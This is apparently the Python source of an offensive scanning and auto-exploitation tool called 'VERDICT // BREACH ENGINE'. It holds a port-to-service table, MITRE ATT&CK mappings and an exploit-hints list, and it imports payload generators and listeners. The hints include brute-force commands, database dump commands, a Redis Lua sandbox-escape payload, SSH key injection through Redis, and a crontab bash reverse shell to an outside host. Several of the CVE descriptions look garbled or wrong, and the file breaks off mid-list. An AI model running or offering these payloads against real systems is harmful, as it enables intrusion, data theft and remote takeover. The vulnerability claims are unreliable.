"""
VERDICT // BREACH ENGINE — goes absolutely nuclear on open ports.
- Banner grabs EVERY open port
- Service fingerprinting via raw TCP + heuristics
- AI-driven breach assessment: model figures out exploitation paths
- MITRE ATT&CK mappings per attack vector
Set VERDICT_REPO=C:\\path\\to\\repo to enable secret scanning.
"""
import subprocess, json, shutil, uuid, hashlib, re, os, ipaddress, tempfile, socket, ssl, time, random
from urllib.request import urlopen, Request
from datetime import datetime, timezone
from planner import plan, analyze, breach_analyze
from exploit import run_auto_exploit, start_listener, generate_payload, list_callbacks, get_callback, serve_payload, set_scope
import stealth

def random_hostname():
    return "mail{}-{}-srv".format(random.randint(100, 999), uuid.uuid4().hex[:6])

def now(): return datetime.now(timezone.utc).strftime("%H:%M:%S")
def log(eng, level, msg): eng["logs"].append({"t": now(), "level": level, "msg": msg})
def ehash(p): return hashlib.sha256(p.encode()).hexdigest()[:16].upper()
def tool(name): return shutil.which(name)

# ---------- SCOPE GATE ----------
def _match(target, pattern):
    p = pattern.lower().strip(); t = target.lower().strip()
    if p.startswith("*."):
        root = p[2:]; return t == root or t.endswith("." + root)
    if "/" in p:
        try: return ipaddress.ip_address(t) in ipaddress.ip_network(p, strict=False)
        except ValueError: return False
    return t == p

def in_scope(target, eng):
    t = target.lower().strip()
    for x in eng["exclusions"]:
        if _match(t, x): return False
    for a in eng["scope"]:
        if _match(t, a): return True
    return False

def clean_host(s):
    return s.replace("https://","").replace("http://","").split("/")[0].split(":")[0]

def run_cmd(args, timeout=600):
    try:
        r = subprocess.run(args, capture_output=True, text=True, timeout=timeout)
        return r.stdout
    except subprocess.TimeoutExpired:
        return ""
    except Exception as e:
        return ""

def tmp_list(items):
    tf = tempfile.NamedTemporaryFile("w", suffix=".txt", delete=False)
    tf.write("\n".join(items)); tf.close(); return tf.name

# ---------- SERVICE BANNER GRABBER (ZERO-INSTALL) ----------
# Common ports and their expected service names
# NOTE: each port appears exactly once (deduplicated 2026-08).
# Ambiguous/secondary names live in PORT_ALTERNATIVES below.
KNOWN_SERVICES = {
    21: 'FTP', 22: 'SSH', 23: 'Telnet', 25: 'SMTP',
    47: 'GRE', 53: 'DNS', 67: 'DHCP', 68: 'DHCP Client',
    69: 'TFTP', 79: 'Finger', 80: 'HTTP', 81: 'HTTP-alt',
    82: 'HTTP-alt', 83: 'HTTP-alt', 84: 'HTTP-alt', 85: 'HTTP-alt',
    86: 'HTTP-alt', 88: 'Kerberos', 90: 'HTTP-alt', 98: 'Linuxconf',
    102: 'Siemens S7', 110: 'POP3', 111: 'RPC Portmapper', 115: 'SFTP',
    135: 'MSRPC', 137: 'NetBIOS Name', 138: 'NetBIOS Datagram', 139: 'NetBIOS Session',
    143: 'IMAP', 161: 'SNMP', 162: 'SNMP Trap', 177: 'XDMCP',
    389: 'LDAP', 443: 'HTTPS', 445: 'SMB', 464: 'Kerberos Change',
    465: 'SMTPS', 500: 'IPsec ISAKMP', 502: 'Modbus', 514: 'Syslog',
    515: 'LPD/LPR', 548: 'AFP', 554: 'RTSP', 587: 'SMTP Submission',
    593: 'MSRPC-HTTP', 631: 'IPP', 636: 'LDAPS', 749: 'Kerberos Admin',
    873: 'Rsync', 989: 'FTPS-Data', 990: 'FTPS-Control', 992: 'Telnet-TLS',
    993: 'IMAPS', 995: 'POP3S', 1080: 'SOCKS', 1090: 'SOCKS-alt',
    1194: 'OpenVPN', 1234: 'Omron FINS', 1433: 'MSSQL', 1434: 'MSSQL Monitor',
    1514: 'Splunk Monitor', 1521: 'Oracle DB', 1701: 'L2TP', 1723: 'PPTP',
    1755: 'MMS', 1883: 'MQTT', 1900: 'SSDP', 1911: 'Niagara Fox',
    1935: 'RTMP', 2000: 'RemotelyAnywhere', 2003: 'Graphite/Carbon', 2004: 'Graphite Pickle',
    2049: 'NFS', 2181: 'ZooKeeper', 2222: 'SSH-alt', 2375: 'Docker API',
    2376: 'Docker API SSL', 2379: 'Etcd', 2380: 'Etcd Peer', 2381: 'Etcd Metrics',
    2455: 'Mitsubishi', 2483: 'Oracle DB-alt', 2484: 'Oracle DB-TLS', 2525: 'SMTP-alt',
    2888: 'ZooKeeper Peer', 3000: 'HTTP-Dev', 3001: 'Node.js Dev-alt', 3002: 'HTTP-alt',
    3128: 'Squid Proxy', 3268: 'Global Catalog', 3269: 'Global Catalog SSL', 3306: 'MySQL',
    3389: 'RDP', 3478: 'STUN/TURN', 3479: 'STUN/TURN TLS', 3690: 'SVN',
    3702: 'WS-Discovery', 3888: 'ZooKeeper Leader', 4000: 'Node.js Dev', 4001: 'Etcd-alt',
    4040: 'Spark UI', 4190: 'ManageSieve', 4200: 'Angular Dev', 4222: 'NATS',
    4243: 'Docker', 4244: 'Docker-TLS', 4444: 'Metasploit', 4500: 'IPsec NAT-T',
    4555: 'SMTP-alt', 4567: 'Sinatra', 4569: 'IAX2', 4646: 'Nomad',
    4647: 'Nomad-RPC', 4800: 'Moxa', 4840: 'OPC-UA', 5000: 'Flask/HTTP-alt',
    5001: 'HTTP-alt', 5002: 'HTTP-alt', 5004: 'RTP', 5005: 'Java Debug',
    5006: 'Java Debug-alt', 5036: 'IAX', 5050: 'Matrix', 5060: 'SIP',
    5061: 'SIPS', 5173: 'Vite Dev', 5222: 'XMPP', 5223: 'XMPP SSL',
    5269: 'XMPP Server', 5280: 'XMPP BOSH', 5349: 'TURN TLS', 5353: 'mDNS',
    5355: 'LLMNR', 5432: 'PostgreSQL', 5601: 'Kibana', 5671: 'RabbitMQ SSL',
    5672: 'RabbitMQ', 5800: 'VNC-HTTP', 5801: 'VNC-HTTP-1', 5858: 'Node.js Debug-alt',
    5900: 'VNC', 5901: 'VNC-1', 5902: 'VNC-2', 5903: 'VNC-3',
    5984: 'CouchDB', 5985: 'WinRM-HTTP', 5986: 'WinRM-HTTPS', 5989: 'CIM/WBEM',
    6001: 'UPnP', 6222: 'NATS Cluster', 6283: 'RemoteAdmin', 6370: 'Redis-Sentinel',
    6379: 'Redis', 6380: 'Redis-TLS', 6443: 'Kubernetes API', 6514: 'Syslog TLS',
    6666: 'IRC-alt', 6667: 'IRC', 6668: 'IRC-SSL', 6669: 'IRC-SSL-alt',
    6831: 'Jaeger Udp', 7000: 'Redis-Cluster', 7001: 'WebLogic', 7002: 'Redis-Cluster',
    7077: 'Spark Master', 7473: 'Neo4j SSL', 7474: 'Neo4j', 7687: 'Neo4j Bolt',
    8000: 'HTTP-alt', 8006: 'Splunk Web', 8008: 'HTTP-alt', 8042: 'YARN',
    8080: 'HTTP-proxy', 8081: 'HTTP-alt', 8082: 'HTTP-proxy-alt', 8083: 'InfluxDB Admin',
    8086: 'InfluxDB', 8088: 'YARN Resource Manager', 8089: 'Splunkd', 8090: 'HTTP-alt',
    8096: 'Emby/Jellyfin', 8118: 'Privoxy', 8123: 'Proxy-alt', 8200: 'Vault',
    8201: 'Vault HA', 8222: 'NATS HTTP', 8291: 'RouterOS Winbox', 8300: 'Consul',
    8301: 'Consul Serf WAN', 8302: 'Consul Serf LAN', 8332: 'Bitcoin JSON-RPC', 8333: 'Bitcoin P2P',
    8443: 'HTTPS-alt', 8444: 'HTTPS-alt', 8448: 'Matrix Federation', 8500: 'Consul DNS',
    8545: 'Ethereum JSON-RPC', 8546: 'Ethereum WebSocket', 8547: 'Ethereum GraphQL', 8554: 'RTSP',
    8600: 'Consul DNS-alt', 8761: 'Eureka', 8770: 'HTTP-Dev-alt', 8777: 'HTTP-alt',
    8787: 'Java Debug', 8880: 'HTTP-alt', 8883: 'MQTT SSL', 8888: 'HTTP-alt',
    8899: 'Solana P2P', 8920: 'Emby SSL', 8983: 'Solr', 9000: 'HTTP-Dev',
    9001: 'Tor Control/HTTP-alt', 9010: 'HTTP-alt', 9042: 'Cassandra CQL', 9050: 'Tor SOCKS',
    9051: 'Tor Control', 9080: 'WebSphere HTTP', 9090: 'Prometheus', 9091: 'Prometheus Pushgateway',
    9092: 'Kafka', 9093: 'Alertmanager', 9099: 'Kuberenetes Metrics', 9100: 'Node Exporter',
    9113: 'Nginx Exporter', 9150: 'Tor Browser', 9160: 'Cassandra Thrift', 9182: 'Fluentd',
    9200: 'Elasticsearch', 9229: 'Node.js Debug', 9256: 'Mongo Exporter', 9300: 'Elasticsearch Transport',
    9418: 'Git', 9419: 'Git-http', 9443: 'HTTPS-alt', 9651: 'Cosmos P2P',
    9997: 'Splunk Forwarder', 10000: 'Webmin', 10001: 'Webmin-alt', 10033: 'Hadoop History',
    10248: 'Kubelet-Health', 10249: 'Kube-Proxy', 10250: 'Kubelet API', 10251: 'Kube-Scheduler',
    10252: 'Kube-Controller', 10255: 'Kubelet Readonly', 10256: 'Kubelet Probe', 10259: 'Kube-Scheduler-New',
    10335: 'Mina P2P', 10443: 'HTTPS-alt2', 11211: 'Memcached', 11214: 'Memcached SSL',
    11215: 'Memcached SSL-alt', 12345: 'NetBus', 12346: 'NetBus-alt', 14250: 'Jaeger gRPC',
    15672: 'RabbitMQ Management', 16443: 'HTTPS-alt3', 16686: 'Jaeger', 18332: 'Bitcoin Testnet-RPC',
    19888: 'YARN History', 20000: 'DNP3', 22222: 'SSH-alt2', 24224: 'Fluentd',
    24225: 'Fluentd-alt', 26656: 'Cosmos P2P', 27017: 'MongoDB', 27018: 'MongoDB-Alt',
    27019: 'MongoDB-Alt2', 27374: 'Sub7', 28015: 'RethinkDB', 29015: 'RethinkDB',
    30303: 'Ethereum P2P', 30304: 'Ethereum P2P-alt', 31337: 'BackOrifice', 32400: 'Plex Server',
    32469: 'Plex', 34980: 'EtherCAT', 35729: 'LiveReload', 44444: 'ActiveMQ-alt',
    44818: 'EtherNet/IP', 47001: 'WinRM-Service', 47808: 'BACnet', 49152: 'RPC-Dynamic',
    49153: 'RPC-Dynamic', 49154: 'RPC-Dynamic', 49155: 'RPC-Dynamic', 49156: 'RPC-Dynamic',
    49157: 'RPC-Dynamic', 50070: 'Hadoop NameNode', 50075: 'Hadoop DataNode', 50090: 'Hadoop SecondaryName',
    54321: 'PCAnywhere', 60010: 'HBase Master', 60030: 'HBase Region', 61613: 'Stomp',
    61614: 'Stomp SSL', 61616: 'ActiveMQ', 61617: 'ActiveMQ SSL',
}

# Secondary/ambiguous service names per port (banner grab may match these).
PORT_ALTERNATIVES = {
    22: ('Git SSH',), 80: ('RouterOS Web',),
    111: ('Portmapper',), 137: ('NetBIOS-Name',),
    139: ('NetBIOS-SSN',), 443: ('RouterOS Web SSL', 'SSH-VPN-alt', 'Git HTTPS'),
    464: ('Kerberos-KPasswd',), 636: ('LDAP-SSL',),
    1521: ('IPsec-alt',), 1900: ('UPnP/SSDP',),
    3000: ('Grafana/GitLab/HTTP-alt', 'Node.js/HTTP-alt'), 3001: ('HTTP-Dev',),
    3268: ('GC-LDAP',), 3269: ('GC-LDAP-SSL',),
    4000: ('Siemens S7-alt',), 4001: ('HTTP-Dev',),
    5000: ('DLNA', 'Flask-Dev'), 5005: ('RTP-alt',),
    6669: ('DarkComet',), 7001: ('Redis-Cluster', 'Etcd-client-alt'),
    8000: ('Solana JSON-RPC', 'HTTP-Dev'), 8080: ('Prometheus-alt', 'Proxy-alt', 'Git HTTP'),
    8081: ('Spark Worker',), 8443: ('Kubernetes-alt', 'SVN HTTPS'),
    8880: ('CDN-Admin',), 9090: ('HTTP-alt',),
    9093: ('Kafka SSL',), 9100: ('JetDirect',),
    9300: ('ES Transport',), 10000: ('Backdoor-alt',),
    10001: ('UPnP-alt',), 20000: ('DDNS/SSM',),
}

# Protocols that get specific banner grab techniques
TCP_BANNER_PORTS = {
    21, 22, 23, 25, 53, 69, 79, 80, 81, 88, 110, 111, 115, 135, 137, 139, 143,
    161, 389, 443, 445, 464, 465, 500, 502, 514, 515, 554, 587, 593, 631, 636,
    873, 989, 990, 992, 993, 995, 1080, 1194, 1352, 1433, 1521, 1701, 1723,
    1883, 1935, 2000, 2049, 2082, 2083, 2181, 2222, 2375, 2376, 2379, 3128,
    3268, 3306, 3389, 3478, 3690, 4000, 4040, 4222, 4369, 4444, 4500, 4567,
    4848, 5000, 5005, 5037, 5060, 5222, 5349, 5432, 5555, 5601, 5671, 5672,
    5800, 5858, 5900, 5984, 5985, 5986, 6000, 6379, 6443, 6667, 6789, 7001,
    7077, 7474, 7687, 8000, 8005, 8008, 8009, 8042, 8069, 8080, 8086, 8089,
    8090, 8091, 8096, 8118, 8200, 8291, 8300, 8332, 8443, 8448, 8500, 8545,
    8554, 8761, 8883, 8888, 8983, 9000, 9042, 9050, 9080, 9090, 9092, 9100,
    9200, 9300, 9418, 9443, 9990, 9997, 10000, 10050, 10250, 10255, 11211,
    12345, 15672, 16686, 20000, 24224, 27017, 28015, 31337, 32400, 32469,
    50070, 50075, 61616, 47808
}

# MITRE ATT&CK techniques per service type
MITRE_MAP = {
    "SSH": {"technique": "T1021.004", "name": "Remote Services: SSH", "tactic": "Lateral Movement"},
    "HTTP": {"technique": "T1190", "name": "Exploit Public-Facing Application", "tactic": "Initial Access"},
    "HTTPS": {"technique": "T1190", "name": "Exploit Public-Facing Application", "tactic": "Initial Access"},
    "MySQL": {"technique": "T1213", "name": "Data from Information Repositories", "tactic": "Collection"},
    "MongoDB": {"technique": "T1213", "name": "Data from Information Repositories", "tactic": "Collection"},
    "Redis": {"technique": "T1213", "name": "Data from Information Repositories", "tactic": "Collection"},
    "PostgreSQL": {"technique": "T1213", "name": "Data from Information Repositories", "tactic": "Collection"},
    "FTP": {"technique": "T1048", "name": "Exfiltration Over Alternative Protocol", "tactic": "Exfiltration"},
    "SMB": {"technique": "T1021.002", "name": "Remote Services: SMB/Windows Admin Shares", "tactic": "Lateral Movement"},
    "RDP": {"technique": "T1021.001", "name": "Remote Services: Remote Desktop Protocol", "tactic": "Lateral Movement"},
    "RPC": {"technique": "T1021.002", "name": "Remote Services: SMB/Windows Admin Shares", "tactic": "Lateral Movement"},
    "Telnet": {"technique": "T1021.004", "name": "Remote Services: SSH", "tactic": "Lateral Movement"},
    "SMTP": {"technique": "T1071.003", "name": "Application Layer Protocol: Mail Protocols", "tactic": "Command and Control"},
    "DNS": {"technique": "T1572", "name": "Protocol Tunneling", "tactic": "Command and Control"},
    "LDAP": {"technique": "T1213.002", "name": "Data from Information Repositories: Active Directory", "tactic": "Collection"},
    "VNC": {"technique": "T1021.005", "name": "Remote Services: VNC", "tactic": "Lateral Movement"},
    "Kubernetes API": {"technique": "T1611", "name": "Escape to Host", "tactic": "Privilege Escalation"},
    "Docker API": {"technique": "T1611", "name": "Escape to Host", "tactic": "Privilege Escalation"},
    "Elasticsearch": {"technique": "T1213", "name": "Data from Information Repositories", "tactic": "Collection"},
    "Kafka": {"technique": "T1213", "name": "Data from Information Repositories", "tactic": "Collection"},
    "Memcached": {"technique": "T1498", "name": "Network Denial of Service: Reflection Amplification", "tactic": "Impact"},
    "RabbitMQ": {"technique": "T1213", "name": "Data from Information Repositories", "tactic": "Collection"},
    "Consul": {"technique": "T1550.002", "name": "Use Alternate Authentication Material: Pass the Hash/Ticket", "tactic": "Defense Evasion"},
    "ZooKeeper": {"technique": "T1213", "name": "Data from Information Repositories", "tactic": "Collection"},
    "NFS": {"technique": "T1048", "name": "Exfiltration Over Alternative Protocol", "tactic": "Exfiltration"},
    "SIP": {"technique": "T1071.003", "name": "Application Layer Protocol: Mail Protocols", "tactic": "Command and Control"},
    "XMPP": {"technique": "T1071", "name": "Application Layer Protocol", "tactic": "Command and Control"},
    "Splunkd": {"technique": "T1555.003", "name": "Credentials from Password Stores: Web Services", "tactic": "Credential Access"},
    "Kibana": {"technique": "T1213", "name": "Data from Information Repositories", "tactic": "Collection"},
    "Cassandra": {"technique": "T1213", "name": "Data from Information Repositories", "tactic": "Collection"},
    "CouchDB": {"technique": "T1213", "name": "Data from Information Repositories", "tactic": "Collection"},
    "InfluxDB": {"technique": "T1213", "name": "Data from Information Repositories", "tactic": "Collection"},
    "Vault": {"technique": "T1555", "name": "Credentials from Password Stores", "tactic": "Credential Access"},
    "Ethereum JSON-RPC": {"technique": "T1190", "name": "Exploit Public-Facing Application", "tactic": "Initial Access"},
    "Webmin": {"technique": "T1190", "name": "Exploit Public-Facing Application", "tactic": "Initial Access"},
    "Solr": {"technique": "T1190", "name": "Exploit Public-Facing Application", "tactic": "Initial Access"},
    "GlassFish": {"technique": "T1190", "name": "Exploit Public-Facing Application", "tactic": "Initial Access"},
    "WebLogic": {"technique": "T1190", "name": "Exploit Public-Facing Application", "tactic": "Initial Access"},
    "JBoss": {"technique": "T1190", "name": "Exploit Public-Facing Application", "tactic": "Initial Access"},
    "Tomcat Shutdown": {"technique": "T1190", "name": "Exploit Public-Facing Application", "tactic": "Initial Access"},
    "cPanel": {"technique": "T1190", "name": "Exploit Public-Facing Application", "tactic": "Initial Access"},
    "Node.js Dev": {"technique": "T1190", "name": "Exploit Public-Facing Application", "tactic": "Initial Access"},
    "Node.js Debug": {"technique": "T1190", "name": "Exploit Public-Facing Application", "tactic": "Initial Access"},
    "Java Debug": {"technique": "T1190", "name": "Exploit Public-Facing Application", "tactic": "Initial Access"},
    "ADB": {"technique": "T1021.001", "name": "Remote Services: Remote Desktop Protocol", "tactic": "Lateral Movement"},
    "NetBus": {"technique": "T1219", "name": "Remote Access Software", "tactic": "Command and Control"},
    "BackOrifice": {"technique": "T1219", "name": "Remote Access Software", "tactic": "Command and Control"},
    "Spark Master": {"technique": "T1190", "name": "Exploit Public-Facing Application", "tactic": "Initial Access"},
    "Spark UI": {"technique": "T1190", "name": "Exploit Public-Facing Application", "tactic": "Initial Access"},
    "YARN": {"technique": "T1190", "name": "Exploit Public-Facing Application", "tactic": "Initial Access"},
    "Hadoop NameNode": {"technique": "T1190", "name": "Exploit Public-Facing Application", "tactic": "Initial Access"},
    "Hadoop DataNode": {"technique": "T1190", "name": "Exploit Public-Facing Application", "tactic": "Initial Access"},
    "Fluentd": {"technique": "T1572", "name": "Protocol Tunneling", "tactic": "Command and Control"},
    "Tor SOCKS": {"technique": "T1572", "name": "Protocol Tunneling", "tactic": "Command and Control"},
    "OpenVPN": {"technique": "T1572", "name": "Protocol Tunneling", "tactic": "Command and Control"},
    "X11": {"technique": "T1021.001", "name": "Remote Services: Remote Desktop Protocol", "tactic": "Lateral Movement"},
    "Zabbix Agent": {"technique": "T1190", "name": "Exploit Public-Facing Application", "tactic": "Initial Access"},
    "Zabbix Server": {"technique": "T1190", "name": "Exploit Public-Facing Application", "tactic": "Initial Access"},
    "Kubelet API": {"technique": "T1611", "name": "Escape to Host", "tactic": "Privilege Escalation"},
    "Jaeger": {"technique": "T1213", "name": "Data from Information Repositories", "tactic": "Collection"},
    "Eureka": {"technique": "T1213", "name": "Data from Information Repositories", "tactic": "Collection"},
    "Squid Proxy": {"technique": "T1090", "name": "Proxy", "tactic": "Command and Control"},
    "AJP": {"technique": "T1190", "name": "Exploit Public-Facing Application", "tactic": "Initial Access"},
    "IRC": {"technique": "T1071", "name": "Application Layer Protocol", "tactic": "Command and Control"},
    "Modbus": {"technique": "T0835", "name": "Modbus", "tactic": "Impair Process Control"},
    "Siemens S7": {"technique": "T0842", "name": "S7 Protocol", "tactic": "Impair Process Control"},
    "DNP3": {"technique": "T0839", "name": "DNP3", "tactic": "Impair Process Control"},
    "BACnet": {"technique": "T0841", "name": "BACnet", "tactic": "Impair Process Control"},
    "EtherNet/IP": {"technique": "T0852", "name": "EtherNet/IP", "tactic": "Impair Process Control"},
    "OPC-UA": {"technique": "T0851", "name": "OPC UA", "tactic": "Impair Process Control"},
    "Etcd": {"technique": "T1213", "name": "Data from Information Repositories", "tactic": "Collection"},
    "Prometheus": {"technique": "T1213", "name": "Data from Information Repositories", "tactic": "Collection"},
    "WinRM": {"technique": "T1021.006", "name": "Remote Services: Windows Remote Management", "tactic": "Lateral Movement"},
    "MQTT": {"technique": "T1071", "name": "Application Layer Protocol", "tactic": "Command and Control"},
    "Neo4j": {"technique": "T1213", "name": "Data from Information Repositories", "tactic": "Collection"},
    "Nomad": {"technique": "T1190", "name": "Exploit Public-Facing Application", "tactic": "Initial Access"},
    "Matrix": {"technique": "T1071", "name": "Application Layer Protocol", "tactic": "Command and Control"},
    "Bitcoin JSON-RPC": {"technique": "T1190", "name": "Exploit Public-Facing Application", "tactic": "Initial Access"},
    "Ethereum P2P": {"technique": "T1190", "name": "Exploit Public-Facing Application", "tactic": "Initial Access"},
    "Plex": {"technique": "T1190", "name": "Exploit Public-Facing Application", "tactic": "Initial Access"},
    "Emby/Jellyfin": {"technique": "T1190", "name": "Exploit Public-Facing Application", "tactic": "Initial Access"},
    "Sub7": {"technique": "T1219", "name": "Remote Access Software", "tactic": "Command and Control"},
    "DarkComet": {"technique": "T1219", "name": "Remote Access Software", "tactic": "Command and Control"},
    "WinRM-HTTP": {"technique": "T1021.006", "name": "Remote Services: Windows Remote Management", "tactic": "Lateral Movement"},
    "WinRM-HTTPS": {"technique": "T1021.006", "name": "Remote Services: Windows Remote Management", "tactic": "Lateral Movement"},
}

# Exploitation suggestions per service + version clues — NUCLEAR EXPANSION
EXPLOIT_HINTS = {
    "SSH": {
        "vectors": [
            "Weak credentials / password brute-force (hydra -l root -P rockyou.txt ssh://host)",
            "CVE-2024-6387 (regreSSHion) — glibc-based RCE on OpenSSH < 4.4p1, 8.5p1-9.7p1 — CHECK VERSION",
            "CVE-2024-3094 (XZ Backdoor) — RCE via sshd on systems with backdoored liblzma (CVE-2024-3094)",
            "CVE-2023-38408 — RCE via forwarded SSH agent (OpenSSH < 9.3p2) — REMOTE CODE EXECUTION",
            "CVE-2023-28531 — privilege escalation via AddKeysToAgent (OpenSSH < 9.3)",
            "CVE-2020-15778 — command injection via scp (OpenSSH < 8.3p1) — RCE",
            "CVE-2018-15473 — user enumeration via timing attack",
            "CVE-2016-0777 — information disclosure via agent forwarding",
            "Authorized_keys injection if .ssh is writable",
            "SSH tunneling for lateral movement once inside",
            "Dropbear SSH < 2020.81 — CVE-2021-3637, CVE-2020-3624 pre-auth RCE",
            "libssh < 0.9.6 — CVE-2021-3638 server-side RCE"
        ],
        "severity": "CRITICAL",
        "mitre": "T1021.004",
        "tools": "hydra, medusa, ncrack, ssh-audit, ssh_scan, crackmapexec ssh"
    },
    "HTTP": {
        "vectors": [
            "Directory traversal / path disclosure — curl path=http://host/cgi-bin/, /actuator/, /swagger-ui/",
            "Default credentials on admin panels (admin:admin, root:root, tomcat:tomcat)",
            "Exposed .git/config, .env, backup files, .DS_Store, /wp-config.php.bak",
            "SQL injection, XSS, SSRF on web applications",
            "Open proxy — pivot point into internal network — CVE-2023-38545 SOCKS5 heap overflow",
            "CORS misconfiguration — data exfiltration via XHR",
            "Server-Side Template Injection (SSTI) — Jinja2, Freemarker, Velocity",
            "Insecure deserialization (Java, Python, PHP) — ysoserial, gadget chains",
            "API endpoints with no auth (Swagger UI, GraphQL playground, Hasura console)",
            "Path traversal — curl path=http://host/../../etc/passwd, ..;/..;/..;/etc/passwd (Tomcat)",
            "LFI to RCE via log poisoning, php://input, php://filter",
            "CVE-2021-41773/42013 — Apache HTTP Server path traversal + RCE (< 2.4.50)",
            "CVE-2021-22986 — BIG-IP iControl REST RCE",
            "CVE-2021-21978 — VMware vCenter SSO RCE",
            "CVE-2023-44487 — HTTP/2 Rapid Reset DDoS",
            "CVE-2023-22527 — Confluence template injection RCE",
            "CVE-2023-34362 — MOVEit Transfer SQLi RCE",
            "CVE-2021-44228 — Log4Shell JNDI injection RCE (Apache Log4j < 2.17.0)",
            "CVE-2022-22965 (Spring4Shell) — Spring Framework RCE via Data Binding",
            "CVE-2021-26084 — Atlassian OGNL injection RCE",
            "CVE-2022-1388 — BIG-IP iControl REST unauthenticated RCE",
            "CVE-2023-46604 — Apache ActiveMQ RCE",
            "CVE-2023-42793 — TeamCity auth bypass RCE",
            "CVE-2024-1709 — ConnectWise ScreenConnect auth bypass RCE",
            "CVE-2024-23897 — Jenkins CLI read-any-file RCE"
        ],
        "severity": "CRITICAL",
        "mitre": "T1190",
        "tools": "gobuster, dirb, ffuf, nikto, wpscan, sqlmap, nuclei, whatweb, wappalyzer"
    },
    "HTTPS": {
        "vectors": [
            "Same as HTTP + TLS-specific attacks:",
            "CVE-2023-4807 — OpenSSL POLY1305 MAC bug DoS (< 3.0.11, 1.1.1w)",
            "CVE-2022-2274 — OpenSSL RSA Key recovery (< 3.0.5)",
            "CVE-2014-0160 (Heartbleed) — memory leak server-side private key + data (OpenSSL < 1.0.1g)",
            "CVE-2023-2976 — Google Trust Services CLR collision",
            "CVE-2022-3786/3602 — OpenSSL X.509 buffer overflow (< 3.0.7)",
            "Weak cipher suites / outdated TLS versions (SSLv3, TLS 1.0, 1.1 — POODLE, BEAST, CRIME)",
            "Certificate transparency — find subdomains via crt.sh",
            "Self-signed certificates — MITM potential, spoofable",
            "Expired certificates — expired SSL/TLS cert suggests poor maintenance",
            "OCSP stapling disabled — certificate revocation checking bypass",
            "HSTS missing — SSL stripping downgrade attack",
            "CVE-2021-3449 — OpenSSL NULL pointer deref DoS (< 1.1.1j)",
            "CVE-2022-3602 — OpenSSL X.509 email address buffer overflow (< 3.0.7)",
            "CVE-2020-1971 — OpenSSL EDIPARTYNAME NULL pointer deref DoS",
            "CVE-2019-1559 — OpenSSL padding oracle attack (< 1.0.2r, 1.1.1d)"
        ],
        "severity": "CRITICAL",
        "mitre": "T1190",
        "tools": "testssl.sh, sslyze, tls-scanner, heartleech, openssl s_client"
    },
    "MySQL": {
        "vectors": [
            "Default root with no password — mysql -h host -u root",
            "Weak credentials — brute-force (hydra -l root -P passwords.txt mysql://host:3306)",
            "CVE-2012-2122 — authentication bypass (same password comparison bug) — MariaDB < 5.1.62, < 5.2.12",
            "CVE-2023-22102 — Oracle MySQL unspecified RCE via protocol",
            "Local file read via LOAD DATA LOCAL INFILE — read /etc/passwd, /etc/shadow",
            "UDF injection for RCE — lib_mysqludf_sys.so sys_exec()",
            "Dump all databases — mysqldump -h host -u root --all-databases",
            "CVE-2023-21971 — MySQL Connector/J RCE via deserialization",
            "CVE-2024-20994 — MySQL Server RCE via unspecified vector",
            "CVE-2021-2471 — MySQL Server DDL RCE",
            "ssl-ca, ssl-cert not required — MITM on replication",
            "Information schema exploitation — enumerate users, passwords, plugins"
        ],
        "severity": "CRITICAL",
        "mitre": "T1213",
        "tools": "hydra, mysql client, sqlmap, nmap --script mysql-audit, cme mysql"
    },
    "MSSQL": {
        "vectors": [
            "Default sa:sa or sa:password — direct admin on 1433",
            "CVE-2023-23394 — Microsoft SQL Server RCE via OLE Automation",
            "CVE-2023-23293 — Microsoft SQL Server RCE via CLR assemblies",
            "CVE-2022-29144 — SQL Server RCE via ODBC driver",
            "xp_cmdshell — enable and run OS commands — EXEC xp_cmdshell 'whoami'",
            "Linked server — pivot through linked SQL servers",
            "Brute-force sa account — hydra -l sa -P rockyou.txt mssql://host",
            "Dump all databases — SELECT name FROM master..sysdatabases",
            "Password hash extraction — SELECT name,password_hash FROM sys.sql_logins",
            "CVE-2021-1636 — SQL Server RCE via .NET assembly",
            "CVE-2021-31980 — SQL Server xp_cmdshell RCE regressed"
        ],
        "severity": "CRITICAL",
        "mitre": "T1213",
        "tools": "hydra, sqsh, sqlcmd, crackmapexec mssql, Metasploit mssql_payload"
    },
    "MongoDB": {
        "vectors": [
            "No auth by default — direct access on 27017 — mongo mongodb://host:27017",
            "Ransomware — all data held for ransom (default mongodb.org ransom operations)",
            "Dump all databases — data exfiltration: mongodump --host host:27017",
            "CVE-2017-17514 — injection via $where clause",
            "CVE-2019-20968 — DoS via overlapping BSON elements",
            "CVE-2021-32039 — MongoDB Server Lock bypass",
            "CVE-2023-0351 — MongoDB Wire Protocol DoS",
            "Create admin user if SCRAM disabled",
            "MapReduce — execute arbitrary JavaScript via $mapReduce",
            "Replica set takeover — inject malicious secondary node"
        ],
        "severity": "CRITICAL",
        "mitre": "T1213",
        "tools": "mongo shell, mongosh, NoSQLMap, jmeter, hydra"
    },
    "PostgreSQL": {
        "vectors": [
            "Trust authentication — no password required (pg_hba.conf trust, local auth)",
            "Weak credentials — brute-force (hydra -l postgres -P passwords.txt postgres://host:5432)",
            "CVE-2014-0060 — MySQL-reminiscent auth bypass via integer overflow",
            "CVE-2018-1058 — superuser via CREATE FUNCTION (copy_to) — RCE",
            "CVE-2019-9192 — code execution via pg_cmd extension — RCE",
            "CVE-2021-23274 — PostgreSQL RCE via lo_import binary path (< 13.2)",
            "CVE-2021-20229 — PostgreSQL RCE via protocol-level injection",
            "CVE-2023-2454 — PostgreSQL extension supervisor bypass",
            "CVE-2023-39417 — PostgreSQL JDBC RCE via pgjdbc",
            "Local file read via COPY ... FROM PROGRAM — RCE on server",
            "CVE-2013-1899 — MITM via SSL downgrade",
            "pg_read_file() — read arbitrary files on server",
            "pg_stat_statements — extract queries (potential secrets in query text)"
        ],
        "severity": "CRITICAL",
        "mitre": "T1213",
        "tools": "hydra, psql, sqlmap, crackmapexec postgres, Metasploit postgres_payload"
    },
    "Redis": {
        "vectors": [
            "No auth by default — direct access on 6379 — redis-cli -h host",
            "CVE-2022-0543 — Lua sandbox escape RCE (Debian/Ubuntu packaged Redis) — eval 'local io_l = package.loadlib(\"/usr/lib/x86_64-linux-gnu/liblua5.1.so.0\", \"luaopen_io\"); local io = io_l(); local f = io.popen(\"id\", \"r\"); local res = f:read(\"*a\"); f:close(); return res' 0",
            "SSH key injection — CONFIG SET dir /root/.ssh; CONFIG SET dbfilename authorized_keys; SAVE",
            "Crontab RCE — CONFIG SET dir /var/spool/cron/; CONFIG SET dbfilename root; set crontab \"* * * * * root bash -c 'bash -i>& /dev/tcp/ip/port 0>&1'\"; BGSAVE",
